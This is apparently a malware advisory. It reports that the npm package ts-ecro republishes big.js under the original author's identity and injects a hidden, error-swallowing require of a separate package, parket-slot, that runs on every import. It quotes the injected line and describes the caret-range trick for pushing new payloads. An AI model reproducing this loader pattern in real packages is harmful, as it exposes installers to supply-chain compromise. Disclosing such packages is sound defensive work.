summary: ts-ecro impersonates big.js and loads attacker-controlled dependency at import
details: The package republishes the verbatim source of big.js v7.0.1 along with the original author's name, email, repository URL, LICENCE, and README, but injects a hidden top-level invocation of a separately-published dependency. In big.js line 606, between method definitions, the code runs `try { const doc = require("parket-slot"); doc.from_str().then(e => { }).catch(e => { }) } catch (error) { }`. The same injection appears in big.mjs. Because this require sits in the module body rather than inside an exported function, it executes on every `require('ts-ecro')` / `import 'ts-ecro'`, and the swallow-all try/catch hides any errors. The dependency is pinned with a caret range (`"parket-slot": "^0.0.6"`), so the author can ship new bytes to all installers via a patch release without republishing ts-ecro. The package metadata copies upstream big.js identity (author `Michael Mclaughlin <M8ch88l@gmail.com>`, repo `MikeMcl/big.js.git`), and the README documents big.js usage, increasing the chance consumers install this expecting the real library and execute whatever parket-slot delivers.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
